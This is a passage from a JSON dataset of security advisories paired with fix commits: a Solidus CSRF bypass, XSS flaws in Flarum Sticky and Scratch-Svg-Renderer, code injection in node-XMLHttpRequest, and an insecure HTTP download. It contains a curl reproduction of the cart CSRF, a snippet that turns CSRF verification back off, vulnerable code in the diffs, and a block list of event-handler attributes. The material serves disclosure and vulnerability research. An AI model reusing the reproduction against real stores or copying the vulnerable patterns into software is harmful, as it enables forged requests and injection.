('attacks', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['frontend\/app\/controllers\/spree\/orders_controller.rb'])","num_files":1.0},{"index":1973,"vuln_id":"GHSA-h3fg-h5v3-vf8m","cwe_id":"{'CWE-352'}","score":5.3,"chain":"{'https:\/\/github.com\/solidusio\/solidus\/commit\/a1b9bf7f24f9b8684fc4d943eacb02b1926c77c6', 'https:\/\/github.com\/solidusio\/solidus\/commit\/4d17cacf066d9492fc04eb3a0b16084b47376d81'}","dataset":"osv","summary":"CSRF forgery protection bypass in solidus_frontend ### Impact\nCSRF vulnerability that allows a malicious site to add an item to the user's cart without their knowledge.\n\nAll `solidus_frontend` versions are affected. If you're using your own storefront, please, follow along to make sure you're not affected.\n\nTo reproduce the issue:\n\n- Pick the id for a variant with available stock. From the rails console:\n\n  ```ruby\n  Spree::Variant.in_stock.pluck(:id)\n  ```\n\n  Say we pick variant id `2`.\n\n- Launch your application, for instance, on `http:\/\/localhost:3000`:\n\n  ```bash\n  bin\/rails server\n  ```\n\n- Open your browser dev tools.\n\n- Click on whatever link in your store.\n\n- Copy the value of the `Cookie` request header sent for the previous request from your browser dev tools.\n\n- Execute the following, using your previously selected variant id and the value of the `Cookie` header (notice how it doesn't contain any authentication token):\n\n  ```bash\n  curl -X POST -d \"variant_id=2&quantity=1\" -H \"Cookie: guest_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklrWlRVMWRQWnpKMVZVdFNXRzlPVW1aaWJHTjZZa0VpIiwiZXhwIjpudWxsLCJwdXIiOiJjb29raWUuZ3Vlc3RfdG9rZW4ifX0%3D--5006ba5d346f621c760a29b6a797bf351d17d1b8; _sandbox_session=vhutu5%2FL9NmWrUpGc3DxrFA%2FFsQD1dHn1cNsD7nvE84zcjWf17Af4%2F%2F2Vab3md71b6KTb9NP6WktdXktpwH4eU01jEGIBXG5%2BMzW5nL0nb4W269qk1io4LYljvoOg8%2BZVll7oJCVkJLKKh0sSoS0Kg8j%2FCHHs%2BsShohP%2BGnA%2Bfr9Ub8H6HofpSmloSpsfHHygmX0ho03fEgzHJ4DD5wJctaNKwg7NhVikHh5kgIPPHl84OGCgv3p2oe9jR19HTxOKq7BtyvDd7XZsecWhkcfS8BPnvDDUWZG6qpAEFI5kWo81KkpSJ%2Bp6Q1HOo8%3D--n3G2vgaDG7VS%2B%2FhF--ZTjxBAkfGG3hpr4GRQ2S1Q%3D%3D; __profilin=p%3Dt\" http:\/\/localhost:3000\/orders\/populate\n  ```\n\n- Reload your browser and look at how your cart got updated.\n\n### Patches\n\nPlease, upgrade `solidus` to versions `3.1.5`, `3.0.5` or `2.11.14`.\n\nAfter upgrading, make sure you read the \"Upgrade notes\"  section below.\n\n### Upgrade notes\n\nThe patch adds CSRF token verification to the \"Add to cart\" action. Adding forgery protection to a form that missed it can have some side effects.\n\n#### `InvalidAuthenticityToken` errors\n\nIf you're using the `:exception` strategy, it's likely that after upgrading, you'll see more `ActionController::InvalidAuthenticityToken` errors popping out in your logs. Due to browser-side cache, a form can be re-rendered and sent without any attached request cookie (for instance, when re-opening a mobile browser). That will cause an authentication error, as the sent token won't match with the one in the session (none in this case). That's a known problem in the Rails community (see https:\/\/github.com\/rails\/rails\/issues\/21948), and, at this point, there's no perfect solution.\n\nAny attempt to mitigate the issue should be seen at the application level. For an excellent survey of all the available options, take a look at https:\/\/github.com\/betagouv\/demarches-simplifiees.fr\/blob\/5b4f7f9ae9eaf0ac94008b62f7047e4714626cf9\/doc\/adr-csrf-forgery.md. The latter is a third-party link. As the information is relevant here, we're going to copy it below, but it should be clear that all the credit goes to @kemenaran:\n\n> # Protecting against request forgery using CRSF tokens\n> \n> ## Context\n> \n> Rails has CSRF protection enabled by default, to protect against POST-based CSRF attacks.\n> \n> To protect from this, Rails stores two copies of a random token (the so-named CSRF token) on each request:\n> - one copy embedded in each HTML page,\n> - another copy in the user session.\n> \n> When performing a POST request, Rails checks that the two copies match \u2013 and otherwise denies the request. This protects against an attacker that would generate a form secretly pointing to our website: the attacker can't read the token in the session, and so can't post a form with a valid token.\n> \n> The problem is that, much more often, this has false positives. There are several cases for that, including:\n> \n> 1. The web browser (often mobile) loads a page containing a form, then is closed by the user. Later, when the browser is re-opened, it restores the page from the cache. But the session cookie has expired, and so is not restored \u2013 so the copy of the CSRF token stored in the session is missing. When the user submits the form, they get an \"InvalidAuthenticityToken\" exception.\n> \n> 2. The user attempts to fill a form, and gets an error message (usually in response to a POST request). They close the browser. When the browser is re-opened, it attempts to restore the page. On Chrome this is blocked by the browser, because the browser denies retrying a (probably non-idempotent) POST request. Safari however happily retries the POST request \u2013 but without sending any cookies (in an attempt to avoid having unexpected side-effects). So the copy of the CSRF token in the session is missing (because no cookie was sent), and the user get an \"InvalidAuthenticityToken\" exception.\n> \n> ## Options considered\n> \n> ### Extend the session cookie duration\n> \n> We can configure the session cookie to be valid for a longer time (like 2 weeks).\n> \n> Pros:\n> - It solves 1., because when the browser restores the page, the session cookie is still valid.\n> \n> Cons:\n> - Users would be signed-in for a much longer time by default, which has unacceptable security implications.\n> - It doesn't solve 2. (because Safari doesn't send any cookie when restoring a page from a POST request)\n> \n> ### Change the cache parameters\n> \n> We can send a HTTP cache header stating 'Cache-Control: no-store, no-cache'. This instructs the browser to never keep any copy of the page, and to always make a request to the server to restore it.\n> \n> This solution was attempted during a year in production, and solved 1. \u2013 but also introduced another type of InvalidAuthenticityToken errors. In that scenario, the user attempts to fill a form, and gets an error message (usually in response to a POST request). They then navigate on another domain (like France Connect), then hit the \"Back\" button. Crossing back the domain boundary may cause the browser to either block the request or retry an invalid POST request.\n> \n> Pros:\n> - It solves 1., because on relaunch the browser requests a fresh page again (instead of serving it from its cache), thus retrieving a fresh session and a fresh matching CSRF token.\n> \n> Cons:\n> - It doesn't solve 2.\n> - It causes another type of InvalidAuthenticityToken errors.\n> \n> ### Using a null-session strategy\n> \n> We can change the default protect_from_forgery strategy to :null_session. This makes the current request use an empty session for the request duration.\n> \n> Pros:\n> - It kind of solves 1., by redirecting to a \"Please sign-in\" page when a stale form is submitted.\n> \n> Cons:\n> - The user is asked to sign-in only after filling and submitting the form, losing their time and data\n> - The user will not be redirected to their original page after signing-in\n> - It has potential security implications: as the (potentically malicious) request runs anyway, variables cached by a controller before the Null session is created may allow the form submission to succeed anyway (https:\/\/www.veracode.com\/blog\/managing-appsec\/when-rails-protectfromforgery-fails)\n> \n> ### Using a reset-session strategy\n> \n> We can change the default protect_from_forgery strategy to :reset_session. This clears the user session permanently, logging them out until they log in again.\n> \n> Pros: \n> - It kind of solves 1., by redirecting to a \"Please sign-in\" page when a stale form is submitted.\n> \n> Cons:\n> - A forgery error in a browser tab will disconnect the user in all its open tabs\n> - It has potential security implications: as the (potentically malicious) request runs anyway, variables cached by a controller before the Null session is created may allow the form submission to succeed anyway (https:\/\/www.veracode.com\/blog\/managing-appsec\/when-rails-protectfromforgery-fails)\n> - It allows an attacker to disconnect an user on demand, which is not only inconvenient, but also has security implication (the attacker could then log the user on it's own attacker account, pretending to be the user account)\n> \n> ### Redirect to login form\n> \n> When a forgery error occurs, we can instead redirect to the login form.\n> \n> Pros:\n> - It kind of solves 1., by redirecting to a \"Please sign-in\" page when a stale form is submitted (but the user data is lost).\n> - It kind of solves 2., by redirecting to a \"Please sign-in\" page when a previously POSTed form is reloaded.\n> \n> Cons:\n> - Not all forms require authentication \u2013 so for public forms there is no point redirecting to the login form. \n> - The user will not be redirected to their original page after signing-in (because setting the redirect path is a state-changing action, and it is dangerous to let an unauthorized request changing the state \u2013 an attacker could control the path where an user is automatically redirected to.)\n> - The implementation is finicky, and may introduce security errors. For instance, a naive implementation that catches the exception and redirect_to the sign-in page will prevent Devise from running a cleanup code \u2013 which means the user will still be logged, and the CSRF protection is bypassed. However a well-tested implementation that lets Devise code run should avoid these pittfalls.\n> \n> ### Using a long-lived cookie for CSRF tokens\n> \n> Instead of storing the CSRF token in the session cookie (which is deleted when the browser is closed), we can instead store it in a longer-lived cookie. For this we need to patch Rails.\n> \n> Pros:\n> - It solves 1., because when the user submits a stale form, even if the session cookie because stale, the long-lived CSRF cookie is still valid.\n> \n> Cons:\n> - It doesn't solve 2., because when Safari retries a POST request, it sends none of the cookies (not even long-lived ones).\n> - Patching Rails may introduce security issues (now or in the future)\n\n#### Broken behavior due to session expiration + template cache\n\nAlthough pretty unlikely, you should make sure that your current setup for cache\/session expiration is compatible. The upgrade can break the addition of products to the cart if both:\n\n- The \"Add to cart\" form is being cached (usually along with the variant information).\n\n- A user session is reset at every or every few requests.\n\nThe token validation depends on the issuing and consuming sessions being the same. If a product page is cached with the token in it, it can become stale on a subsequent rendering if the session changes.\n\nTo check that you're safe, after having upgraded locally, go through the following steps:\n\n- Enable cache on dev mode:\n\n  ```bash\n  bin\/rails dev:cache\n  ```\n\n- Visit the page for a variant with stock.\n\n- Reload that page several times.\n\n- Click on the \"Add to cart\"  button.\n\n- Remember to rerun `bin\/rails dev:cache` to turn off cache again.\n\nNo error or session reset should happen.\n\nOtherwise, you can try with:\n\n- Revisiting how your session gets expired.\n- Changing the caching strategy to exclude the token.\n\n#### Using weaker CSRF protection strategies\n\nIt's also important to understand that a complete fix will only be in place when using the `:exception` forgery protection strategy. The `solidus_frontend` engine can't do pretty much anything otherwise. Using weaker CSRF strategies should be an informed and limited decision made by the application team. After the upgrade:\n\n- An app using `:null_session` should also be safe, but there will be side effects. That strategy runs with a null object session. As such, no order and no user is found on it. A new `cart` state order is created in the database, associated with no user. Next time the user visits the site, they won't find any difference in its cart state.\n\n- An app using `:reset_session` is not entirely safe. That strategy resets the session. That means that registered users will be logged out. Next time a user visits, they'll see the cart with the items added during the CSRF attack, although it won't be associated with their account in the case of registered users.\n\n#### Reversing the update\n\nIf you still want to deploy the upgraded version before changing your application code (if the latter is needed), you can add the following workaround to your `config\/application.rb` (however, take into account that you'll keep being vulnerable):\n\n```ruby\nconfig.after_initialize do\n  Spree::OrdersController.skip_before_action :verify_authenticity_token, only: [:populate]\nend\n```\n\n### Workarounds\n\nIf an upgrade is not an option, you can work around the issue by adding the following to `config\/application.rb`:\n\n```ruby\nconfig.after_initialize do\n  Spree::OrdersController.protect_from_forgery with: ApplicationController.forgery_protection_strategy.name.demodulize.underscore.to_sym, only: [:populate]\nend\n```\n\nHowever, go through the same safety check detailed on \"Upgrade notes\" above.\n\n### References\n\n- [CSRF on the Rails guides](https:\/\/guides.rubyonrails.org\/security.html#cross-site-request-forgery-csrf)\n- [How CSRF tokens are generated and validated on Rails](https:\/\/medium.com\/rubyinside\/a-deep-dive-into-csrf-protection-in-rails-19fa0a42c0ef)\n- [Solidus security](https:\/\/solidus.io\/security\/)\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an [issue](https:\/\/github.com\/solidusio\/solidus\/issues) or a [discussion](https:\/\/github.com\/solidusio\/solidus\/discussions) in Solidus.\n* Email us at [security@solidus.io](mailto:security@soliidus.io)\n* Contact the core team on [Slack](http:\/\/slack.solidus.io\/)","published_date":"2022-01-06","chain_len":2,"project":"https:\/\/github.com\/solidusio\/solidus","commit_href":"https:\/\/github.com\/solidusio\/solidus\/commit\/4d17cacf066d9492fc04eb3a0b16084b47376d81","commit_sha":"4d17cacf066d9492fc04eb3a0b16084b47376d81","patch":"MULTI","chain_ord":"['4d17cacf066d9492fc04eb3a0b16084b47376d81', 'a1b9bf7f24f9b8684fc4d943eacb02b1926c77c6']","before_first_fix_commit":"{'4d17cacf066d9492fc04eb3a0b16084b47376d81', 'c6b892696881f88d209efaedd8bb378e8261953f'}","last_fix_commit":"a1b9bf7f24f9b8684fc4d943eacb02b1926c77c6","chain_ord_pos":1.0,"commit_datetime":"12\/14\/2021, 09:36:44","message":"Protect `Spree::OrdersController#populate` against CSRF attacks\n\nSee\nhttps:\/\/github.com\/solidusio\/solidus\/security\/advisories\/GHSA-h3fg-h5v3-vf8m\nfor all the details.\n\nSome time ago, all order actions were left out of CSRF protection (see\n95ea57058ab1c5e722b327b10747cd41e68a4deb). The reason given was that the\nauthentication token got stale after the second rendering because the\nproduct page is cached. That was limited to `#populate` in\ncb797542c6948ef33d2cc9e6076c88f4cc927fb2 (see also\nhttps:\/\/github.com\/spree\/spree\/pull\/5601).\n\nHowever, those assumptions are not correct. Although the authenticity\ntoken changes at every request, that doesn't mean that the old ones are\nno longer valid. The variation comes from a one-time pad added to a\nsession-dependant token (and meant to avoid timing attacks). However,\nbefore validation, that one-time pad is removed. That means the token\nremains valid as long as the session has not been reset. Think about\nsubmitting a form from one browser tab after opening another with the\nsame URL. Even if both tokens differ, the submission from the first tab\nwill still be valid. You can read\nhttps:\/\/medium.com\/rubyinside\/a-deep-dive-into-csrf-protection-in-rails-19fa0a42c0ef\nfor an in-deep understanding.\n\nThe initial confusion could come because of\nhttps:\/\/github.com\/rails\/rails\/issues\/21948. Due to browser-side cache,\na form can be re-rendered and sent without any attached request cookie.\nThat will cause an authentication error, as the sent token won't match\nwith the one in the session (none in this case). There's no perfect\nsolution for that, and all partial fixes should be seen at the\napplication level. From our side, we must provide a safe default. For an\nexcellent survey of all the available options, take a look at\nhttps:\/\/github.com\/betagouv\/demarches-simplifiees.fr\/blob\/5b4f7f9ae9eaf0ac94008b62f7047e4714626cf9\/doc\/adr-csrf-forgery.md.\nThe information given in that link is third-party but it's very\nrelevant here. For that reason we've copied it in the security advisory\n(see link above), but all the credit goes to @kemenaran.","author":"Marc Busqu\u00e9","comments":null,"stats":"{'additions': 0, 'deletions': 1, 'total': 1}","files":"{'frontend\/app\/controllers\/spree\/orders_controller.rb': {'additions': 0, 'deletions': 1, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/solidusio\/solidus\/raw\/4d17cacf066d9492fc04eb3a0b16084b47376d81\/frontend%2Fapp%2Fcontrollers%2Fspree%2Forders_controller.rb', 'patch': \"@@ -10,7 +10,6 @@ class OrdersController < Spree::StoreController\\n     before_action :assign_order, only: :update\\n     # note: do not lock the #edit action because that's where we redirect when we fail to acquire a lock\\n     around_action :lock_order, only: :update\\n-    skip_before_action :verify_authenticity_token, only: [:populate]\\n \\n     def show\\n       @order = Spree::Order.find_by!(number: params[:id])\"}}","message_norm":"protect `spree::orderscontroller#populate` against csrf attacks\n\nsee\nhttps:\/\/github.com\/solidusio\/solidus\/security\/advisories\/ghsa-h3fg-h5v3-vf8m\nfor all the details.\n\nsome time ago, all order actions were left out of csrf protection (see\n95ea57058ab1c5e722b327b10747cd41e68a4deb). the reason given was that the\nauthentication token got stale after the second rendering because the\nproduct page is cached. that was limited to `#populate` in\ncb797542c6948ef33d2cc9e6076c88f4cc927fb2 (see also\nhttps:\/\/github.com\/spree\/spree\/pull\/5601).\n\nhowever, those assumptions are not correct. although the authenticity\ntoken changes at every request, that doesn't mean that the old ones are\nno longer valid. the variation comes from a one-time pad added to a\nsession-dependant token (and meant to avoid timing attacks). however,\nbefore validation, that one-time pad is removed. that means the token\nremains valid as long as the session has not been reset. think about\nsubmitting a form from one browser tab after opening another with the\nsame url. even if both tokens differ, the submission from the first tab\nwill still be valid. you can read\nhttps:\/\/medium.com\/rubyinside\/a-deep-dive-into-csrf-protection-in-rails-19fa0a42c0ef\nfor an in-deep understanding.\n\nthe initial confusion could come because of\nhttps:\/\/github.com\/rails\/rails\/issues\/21948. due to browser-side cache,\na form can be re-rendered and sent without any attached request cookie.\nthat will cause an authentication error, as the sent token won't match\nwith the one in the session (none in this case). there's no perfect\nsolution for that, and all partial fixes should be seen at the\napplication level. from our side, we must provide a safe default. for an\nexcellent survey of all the available options, take a look at\nhttps:\/\/github.com\/betagouv\/demarches-simplifiees.fr\/blob\/5b4f7f9ae9eaf0ac94008b62f7047e4714626cf9\/doc\/adr-csrf-forgery.md.\nthe information given in that link is third-party but it's very\nrelevant here. for that reason we've copied it in the security advisory\n(see link above), but all the credit goes to @kemenaran.","language":"en","entities":"[('protect', 'ACTION', ''), ('csrf', 'SECWORD', ''), ('attacks', 'FLAW', ''), ('https:\/\/github.com\/solidusio\/solidus\/security\/advisories\/ghsa-h3fg-h5v3-vf8m', 'VULNID', 'GHSA'), ('csrf', 'SECWORD', ''), ('protection', 'SECWORD', ''), ('95ea57058ab1c5e722b327b10747cd41e68a4deb', 'SHA', 'generic_sha'), ('authentication', 'SECWORD', ''), ('cb797542c6948ef33d2cc9e6076c88f4cc927fb2', 'SHA', 'generic_sha'), ('https:\/\/github.com\/spree\/spree\/pull\/5601', 'URL', ''), ('added', 'ACTION', ''), ('attacks', 'SECWORD', ''), ('removed', 'ACTION', ''), ('https:\/\/medium.com\/rubyinside\/a-deep-dive-into-csrf-protection-in-rails-19fa0a42c0ef', 'SECWORD', ''), ('https:\/\/github.com\/rails\/rails\/issues\/21948', 'URL', ''), ('cookie', 'SECWORD', ''), ('authentication', 'SECWORD', ''), ('error', 'FLAW', ''), ('safe', 'SECWORD', ''), ('https:\/\/github.com\/betagouv\/demarches-simplifiees.fr\/blob\/5b4f7f9ae9eaf0ac94008b62f7047e4714626cf9\/doc\/adr-csrf-forgery.md', 'SECWORD', ''), ('security', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['frontend\/app\/controllers\/spree\/orders_controller.rb'])","num_files":1.0},{"index":1974,"vuln_id":"GHSA-h3gg-7wx2-cq3h","cwe_id":"{'CWE-79'}","score":0.0,"chain":"{'https:\/\/github.com\/flarum\/sticky\/commit\/7ebd30462bd405c4c0570b93a6d48710e6c3db19'}","dataset":"osv","summary":"XSS in Flarum Sticky extension ### Impact\nA change in release beta 14 of the Sticky extension caused the plain text content of the first post of a pinned discussion to be injected as HTML on the discussion list. The issue was discovered following an internal audit.\n\nAny HTML would be injected through Mithril's `m.trust()` helper. This resulted in an HTML injection where `<script>` tags would not be executed. However it was possible to run javascript from other HTML attributes, enabling a cross-site scripting (XSS) attack to be performed.\n\nSince the exploit only happens with the first post of a pinned discussion, an attacker would need the ability to pin their own discussion, or be able to edit a discussion that was previously pinned.\n\nOn forums where all pinned posts are authored by your staff, you can be relatively certain the vulnerability has not been exploited.\n\nForums where some user-created discussions were pinned can look at the first post edit date to find whether the vulnerability might have been exploited. Because Flarum doesn't store the post content history, you cannot be certain if a malicious edit was reverted.\n\n### Patches\nThe fix will be available in version v0.1.0-beta.16 with Flarum beta 16. The fix has already been back-ported to Flarum beta 15 as version v0.1.0-beta.15.1 of the Sticky extension.\n\n### Workarounds\nForum administrators can disable the Sticky extension until they are able to apply the update. The vulnerability cannot be exploited while the extension is disabled.\n\n### References\n\n- [Release announcement](https:\/\/discuss.flarum.org\/d\/26042-security-update-to-flarum-sticky-010-beta151)\n- [Pull Request](https:\/\/github.com\/flarum\/sticky\/pull\/24)\n\n### For more information\nIf you have any questions or comments about this advisory, please start a new discussion on our [support forum](https:\/\/discuss.flarum.org\/t\/support).\n\nIf you discover a security vulnerability within Flarum, please send an e-mail to [security@flarum.org](mailto:security@flarum.org). All security vulnerabilities will be promptly addressed. More details can be found in our [security policy](https:\/\/github.com\/flarum\/core\/security\/policy).","published_date":"2021-01-29","chain_len":1,"project":"https:\/\/github.com\/flarum\/sticky","commit_href":"https:\/\/github.com\/flarum\/sticky\/commit\/7ebd30462bd405c4c0570b93a6d48710e6c3db19","commit_sha":"7ebd30462bd405c4c0570b93a6d48710e6c3db19","patch":"SINGLE","chain_ord":"['7ebd30462bd405c4c0570b93a6d48710e6c3db19']","before_first_fix_commit":"{'62a74d25ab3f84f69d1c4b5920080963788a8360'}","last_fix_commit":"7ebd30462bd405c4c0570b93a6d48710e6c3db19","chain_ord_pos":1.0,"commit_datetime":"01\/22\/2021, 18:53:11","message":"Fix evaluation of post content by m.trust() (#24)","author":"Sami Mazouz","comments":null,"stats":"{'additions': 2, 'deletions': 1, 'total': 3}","files":"{'js\/src\/forum\/addStickyExcerpt.js': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/flarum\/sticky\/raw\/7ebd30462bd405c4c0570b93a6d48710e6c3db19\/js%2Fsrc%2Fforum%2FaddStickyExcerpt.js', 'patch': \"@@ -21,7 +21,8 @@ export default function addStickyControl() {\\n       if (firstPost) {\\n         const excerpt = truncate(firstPost.contentPlain(), 175);\\n \\n-        items.add('excerpt', m.trust(excerpt), -100);\\n+        \/\/ Wrapping in <div> because ItemList entries need to be vnodes\\n+        items.add('excerpt', <div>{excerpt}<\/div>, -100);\\n       }\\n     }\\n   });\"}}","message_norm":"fix evaluation of post content by m.trust() (#24)","language":"en","entities":"[('fix', 'ACTION', ''), ('#24', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['js\/src\/forum\/addStickyExcerpt.js'])","num_files":1.0},{"index":1978,"vuln_id":"GHSA-h3vq-wv8j-36gw","cwe_id":"{'CWE-79'}","score":0.0,"chain":"{'https:\/\/github.com\/LLK\/scratch-svg-renderer\/commit\/7c74ec7de3254143ec3c557677f5355a90a3d07f'}","dataset":"osv","summary":"Cross-site Scripting in Scratch-Svg-Renderer A DOM-based cross-site scripting (XSS) vulnerability in Scratch-Svg-Renderer v0.2.0 allows attackers to execute arbitrary web scripts or HTML via a crafted sb3 file.","published_date":"2022-01-08","chain_len":1,"project":"https:\/\/github.com\/LLK\/scratch-svg-renderer","commit_href":"https:\/\/github.com\/LLK\/scratch-svg-renderer\/commit\/7c74ec7de3254143ec3c557677f5355a90a3d07f","commit_sha":"7c74ec7de3254143ec3c557677f5355a90a3d07f","patch":"SINGLE","chain_ord":"['7c74ec7de3254143ec3c557677f5355a90a3d07f']","before_first_fix_commit":"{'d010f2d0edc3ab87ecabb27b9160f91317aa2722'}","last_fix_commit":"7c74ec7de3254143ec3c557677f5355a90a3d07f","chain_ord_pos":1.0,"commit_datetime":"10\/09\/2020, 19:50:27","message":"Remove lots of event handlers","author":"Eric Rosenbaum","comments":null,"stats":"{'additions': 15, 'deletions': 2, 'total': 17}","files":"{'src\/fixup-svg-string.js': {'additions': 15, 'deletions': 2, 'changes': 17, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/LLK\/scratch-svg-renderer\/raw\/7c74ec7de3254143ec3c557677f5355a90a3d07f\/src%2Ffixup-svg-string.js', 'patch': '@@ -50,8 +50,21 @@ module.exports = function (svgString) {\\n     \/\/ Empty script tags and javascript executing\\n     svgString = svgString.replace(\/<script[\\\\s\\\\S]*>[\\\\s\\\\S]*<\\\\\/script>\/, \\'<script><\/script>\\');\\n     \\n-    \/\/ Remove error handlers\\n-    svgString = svgString.replace(\/onerror=[\\\\s\\\\S]*[\\'\"].*?[\\'\"]\/i, \\'\\');\\n+    \/\/ Remove event handlers\\n+    const eventNames = [\\n+        \\'onbegin\\', \\'onend\\', \\'onrepeat\\', \\'onabort\\', \\'onerror\\', \\'onresize\\', \\'onscroll\\', \\'onunload\\', \\'oncopy\\',\\n+        \\'oncut\\', \\'onpaste\\', \\'oncancel\\', \\'oncanplay\\', \\'oncanplaythrough\\', \\'onchange\\', \\'onclick\\', \\'onclose\\',\\n+        \\'oncuechange\\', \\'ondblclick\\', \\'ondrag\\', \\'ondragend\\', \\'ondragenter\\', \\'ondragexit\\', \\'ondragleave\\',\\n+        \\'ondragover\\', \\'ondragstart\\', \\'ondrop\\', \\'ondurationchange\\', \\'onloadeddata\\', \\'onloadedmetadata\\',\\n+        \\'onloadstart\\', \\'onmousedown\\', \\'onmouseenter\\', \\'onmouseleave\\', \\'onmousemove\\',\\n+        \\'onemptied\\', \\'onended\\', \\'onerror\\', \\'onfocus\\', \\'oninput\\', \\'oninvalid\\', \\'onkeydown\\', \\'onkeypress\\',\\n+        \\'onkeyup\\', \\'onload\\', \\'onmouseout\\', \\'onmouseover\\', \\'onmouseup\\', \\'onmousewheel\\', \\'onpause\\', \\'onplay\\',\\n+        \\'onplaying\\', \\'onprogress\\', \\'onratechange\\', \\'onreset\\', \\'onresize\\', \\'onscroll\\', \\'onseeked\\', \\'onseeking\\',\\n+        \\'onselect\\', \\'onshow\\', \\'onstalled\\', \\'onsubmit\\', \\'onsuspend\\', \\'ontimeupdate\\', \\'ontoggle\\', \\'onvolumechange\\',\\n+        \\'onwaiting\\', \\'onactivate\\', \\'onfocusin\\', \\'onfocusout\\'\\n+    ];\\n+    const eventsRegex = new RegExp(`(${eventNames.join(\\'|\\')})\\\\\\\\s*=\\\\\\\\s*[\\'\"].*[\\'\"]`, \\'i\\');\\n+    svgString = svgString.replace(eventsRegex, \\'\\');\\n \\n     return svgString;\\n };'}}","message_norm":"remove lots of event handlers","language":"en","entities":"[('remove', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/fixup-svg-string.js'])","num_files":1.0},{"index":1985,"vuln_id":"GHSA-h4j5-c7cj-74xg","cwe_id":"{'CWE-94'}","score":9.8,"chain":"{'https:\/\/github.com\/mjwwit\/node-XMLHttpRequest\/commit\/ee1e81fc67729c7c0eba5537ed7fe1e30a6b3291', 'https:\/\/github.com\/driverdan\/node-XMLHttpRequest\/commit\/983cfc244c7567ad6a59e366e55a8037e0497fe6'}","dataset":"osv","summary":"Arbitrary Code Injection This affects the package xmlhttprequest before 1.7.0; all versions of package xmlhttprequest-ssl. Provided requests are sent synchronously (async=False on xhr.open), malicious user input flowing into xhr.send could result in arbitrary code being injected and run.","published_date":"2021-05-04","chain_len":2,"project":"https:\/\/github.com\/driverdan\/node-XMLHttpRequest","commit_href":"https:\/\/github.com\/driverdan\/node-XMLHttpRequest\/commit\/983cfc244c7567ad6a59e366e55a8037e0497fe6","commit_sha":"983cfc244c7567ad6a59e366e55a8037e0497fe6","patch":"MULTI","chain_ord":"['983cfc244c7567ad6a59e366e55a8037e0497fe6', 'ee1e81fc67729c7c0eba5537ed7fe1e30a6b3291']","before_first_fix_commit":"{'bf53329b61ca6afc5d28f6b8d2dc2e3ca740a9b2'}","last_fix_commit":"ee1e81fc67729c7c0eba5537ed7fe1e30a6b3291","chain_ord_pos":1.0,"commit_datetime":"07\/19\/2013, 02:34:33","message":"fix for backslashes in data not encoding correctly","author":"Kris Nye","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/XMLHttpRequest.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/driverdan\/node-XMLHttpRequest\/raw\/983cfc244c7567ad6a59e366e55a8037e0497fe6\/lib%2FXMLHttpRequest.js', 'patch': '@@ -477,7 +477,7 @@ exports.XMLHttpRequest = function() {\\n         + \"fs.writeFileSync(\\'\" + contentFile + \"\\', \\'NODE-XMLHTTPREQUEST-ERROR:\\' + JSON.stringify(error), \\'utf8\\');\"\\n         + \"fs.unlinkSync(\\'\" + syncFile + \"\\');\"\\n         + \"});\"\\n-        + (data ? \"req.write(\\'\" + data.replace(\/\\'\/g, \"\\\\\\\\\\'\") + \"\\');\":\"\")\\n+        + (data ? \"req.write(\\'\" + JSON.stringify(data).slice(1,-1).replace(\/\\'\/g, \"\\\\\\\\\\'\") + \"\\');\":\"\")\\n         + \"req.end();\";\\n       \/\/ Start the other Node Process, executing this string\\n       var syncProc = spawn(process.argv[0], [\"-e\", execString]);'}}","message_norm":"fix for backslashes in data not encoding correctly","language":"en","entities":"[('fix', 'ACTION', ''), ('encoding', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/XMLHttpRequest.js'])","num_files":1.0},{"index":1986,"vuln_id":"GHSA-h4mc-r4f4-hcf4","cwe_id":"{'CWE-311'}","score":8.1,"chain":"{'https:\/\/github.com\/spunjs\/selenium-binaries\/commit\/be37e82a3c43a4f1679d66cf9467085ec9994c47'}","dataset":"osv","summary":"selenium-binaries downloads resources over HTTP Versions of `selenium-binaries` prior to 0.15.0 insecurely download an executable over an unencrypted HTTP connection. \n\nIn scenarios where an attacker has a privileged network position, it is possible to intercept the response and replace the executable with a malicious one, resulting in code execution on the system running `selenium-binaries`.\n\n\n## Recommendation\n\nA fix for this vulnerability is available on the `master` branch of the repository as part of version 0.15.0.\n\nAnother mitigation currently available is to use an alternate package, such as [selenium-webdriver](https:\/\/www.npmjs.com\/package\/selenium-webdriver), the official selenium bindings for node.js.","published_date":"2019-02-18","chain_len":1,"project":"https:\/\/github.com\/spunjs\/selenium-binaries","commit_href":"https:\/\/github.com\/spunjs\/selenium-binaries\/commit\/be37e82a3c43a4f1679d66cf9467085ec9994c47","commit_sha":"be37e82a3c43a4f1679d66cf9467085ec9994c47","patch":"SINGLE","chain_ord":"['be37e82a3c43a4f1679d66cf9467085ec9994c47']","before_first_fix_commit":"{'75b0fd18ffd6373fd09d39c48b1df632f9649c08'}","last_fix_commit":"be37e82a3c43a4f1679d66cf9467085ec9994c47","chain_ord_pos":1.0,"commit_datetime":"09\/22\/2020, 17:20:26","message":"Avoid MiTM by downloading through https (#33)\n\nCo-authored-by: Alejandro Romero Herrera <alromh87@gmail.com>\r\nCo-authored-by: Raj <70631238+418raj@users.noreply.github.com>","author":"huntr-helper","comments":null,"stats":"{'additions': 3, 'deletions': 3, 'total': 6}","files":"{'lib\/config.js': {'additions': 3, 'deletions': 3, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/spunjs\/selenium-binaries\/raw\/be37e82a3c43a4f1679d66cf9467085ec9994c47\/lib%2Fconfig.js', 'patch': \"@@ -35,7 +35,7 @@ module.exports = {\\n     seleniumserver: {\\n       version: SELENIUM_BINARIES_SERVER_STANDALONE_VERSION,\\n       url: util.format(\\n-        'http:\/\/selenium-release.storage.googleapis.com\/%s\/',\\n+        'https:\/\/selenium-release.storage.googleapis.com\/%s\/',\\n         